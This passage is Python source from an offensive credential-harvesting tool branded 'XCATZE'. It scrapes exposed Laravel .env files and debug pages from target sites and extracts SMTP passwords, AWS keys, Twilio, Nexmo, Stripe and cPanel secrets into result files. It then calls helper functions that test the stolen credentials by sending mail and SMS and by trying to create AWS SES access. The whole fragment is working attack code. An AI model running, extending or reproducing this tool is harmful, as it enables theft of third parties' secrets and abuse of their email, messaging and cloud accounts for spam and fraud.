          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAIL_FROM_ADDRESS: '+str(emailform)
          remover = str(build).replace('\r', '')
          print ("\033[1;40m[BY XCATZE] {} |   \033[1;32;40m amazonaws\n".format(str(url)))
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mFailed Send\n".format(str(url)))

        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mSendgrid\n".format(str(url)))
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mmailgun\n".format(str(url)))
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40msparkpostmail\n".format(str(url)))
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mmandrillapp\n".format(str(url)))
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mrelay\n".format(str(url)))
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mzoho\n".format(str(url)))
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40m1and1\n".format(str(url)))
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on" :
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40moffice365\n".format(str(url)))
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mZimbra\n".format(str(url)))
          save = open('result/zimbra.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mSMTP Random\n".format(str(url)))
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mInvalid SMTP\n".format(str(url)))  
        try:
          sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mFailed Send\n".format(str(url)))
    else:
      print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mFailed SMTP\n".format(str(url)))



    if "TWILIO_ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
      try:
        phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
      except:
        phone = ""
      auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]

      build = 'URL: '+url+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif "TWILIO_SID=" in text and twillio() == "on":
      acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
      acc_key = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = reg('\nTWILIO_FROM=(.*?)\n', text)[0]
      except:
        acc_from = ""
    
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except: 
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif "ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = reg('\nACCOUNT_SID=(.*?)\n', text)[0]
      acc_key = reg('\nAUTH_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = reg('\nTwilio_Number=(.*?)\n', text)[0]
      except:
        acc_from = ""
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mInvalid Twillio\n".format(url))



    if 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "on":
      mailhost = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'AWS_KEY=' in text and AWS_KEY() == "on":
      mailhost = reg("\nAWS_KEY=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'AWSAPP_KEY=' in text and AWS_KEY() == "on":
      mailhost = reg("\nAWSAPP_KEY=(.*?)\n", text)[0]
      mailport = reg("\nAWSAPP_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nAWSAPP_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'SES_KEY=' in text and AWS_KEY() == "on":
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mAWS_ACCESS_KEY".format(str(url)))
      mailhost = reg("\nSES_KEY=(.*?)\n", text)[0]
      mailport = reg("\nSES_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nSES_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(mailhost)+'\nSES_SECRET: '+str(mailport)+'\nSES_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))

    
    if 'MAILER_DSN=' in text:
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mSYMFONY\n".format(str(url)))
      mailhost = reg("\nMAILER_DSN=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(mailhost)
      remover = str(build).replace('\r', '')
      if str(mailhost) != "" and  str(mailhost) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    if "NEXMO" in text and NEXMO() == "on":
      if "NEXMO_KEY=" in text:
        try:
          nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
      elif "NEXMO_API_KEY=" in text:
        try:
          nexmo_key = reg('\nNEXMO_API_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nNEXMO_API_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nNEXMO_API_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))


    if "EXOTEL_API_KEY" in text and EXOTEL() == "on":
      if "EXOTEL_API_KEY=" in text:
        try:
          exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
        except:
          exotel_api = ''
        try:
          exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
        except:
          exotel_token = ''
        try:
          exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
        except:
          exotel_sid = ''
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mEXOTEL\n".format(str(url)))
        build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
        remover = str(build).replace('\r', '')
        save = open('result/EXOTEL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()


    if "ONESIGNAL_APP_ID" in text and ONESIGNAL() == "on":
      if "ONESIGNAL_APP_ID=" in text:
        try:
          onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
        except:
          onesignal_auth = ''
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mONESIGNAL\n".format(str(url)))
        build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
        remover = str(build).replace('\r', '')
        save = open('result/ONESIGNAL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if "TOKBOX_KEY_DEV" in text and TOKBOX() == "on":
      if "TOKBOX_KEY_DEV=" in text:
        try:
          tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    elif "TOKBOX_KEY" in text and TOKBOX() == "on":
      if "TOKBOX_KEY=" in text:
        try:
          tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    
    if "CPANEL_HOST=" in text:
      try:
        cipanel_host = reg('\nCPANEL_HOST=(.*?)\n', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = reg('\nCPANEL_PORT=(.*?)\n', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = reg('\nCPANEL_USERNAME=(.*?)\n', text)[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = reg('\nCPANEL_PASSWORD=(.*?)\n', text)[0]
      except:
        cipanel_pw = ''
      build = 'URL: '+str(url)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "STRIPE_KEY=" in text:
      try:
        stripe_1 = reg("\nSTRIPE_KEY=(.*?)\n", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = reg("\nSTRIPE_SECRET=(.*?)\n", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('Result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass









def get_smtp2(url,text):
  try:
    if "<td>MAIL_HOST</td>" in text:
      if "<td>MAIL_HOST</td>" in text:
        mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailport =  587
        mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailfrom = reg('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailfrom = "unknown@unknown.com"
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(emailform)
          remover = str(build).replace('\r', '')
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40m amazonaws\n".format(str(url)))
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            pass
        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mSendgrid\n".format(str(url)))
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mmailgun\n".format(str(url)))
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40msparkpostmail\n".format(str(url)))
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mmandrillapp\n".format(str(url)))
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mzoho\n".format(str(url)))
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mrelay\n".format(str(url)))
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40m1and1\n".format(str(url)))
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40moffice365\n".format(str(url)))
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mZimbra\n".format(str(url)))
          save = open('result/zimbra.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mSMTP Random\n".format(str(url)))
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mInvalid SMTP\n".format(str(url)))  
        try:
          sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mFailed Send\n".format(str(url)))
    else:
      print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mFailed GET SMTP".format(str(url)))

    if '<td>TWILIO_ACCOUNT_SID</td>' in text and twillio() == "on":
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mTwillio\n".format(str(url)))
      acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_key = "NULL"
      try:
        sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        sec = "NULL"
      try:
        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        chatid = "null"
      try:
        phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = "NULL"
      try:
        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        auhtoken = "NULL"
      build = 'URL: '+str(url)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif '<td>TWILIO_SID</td>' in text:
      acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = reg('<td>TWILIO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mInvalid Twillio\n".format(url))

    elif '<td>ACCOUNT_SID</td>' in text:
      acc_sid = reg('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = reg('<td>Twilio_Number<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mInvalid Twillio\n".format(url))

    
    if '<td>NEXMO_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
    
    elif '<td>NEXMO_API_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = reg('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>NEXMO_API_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
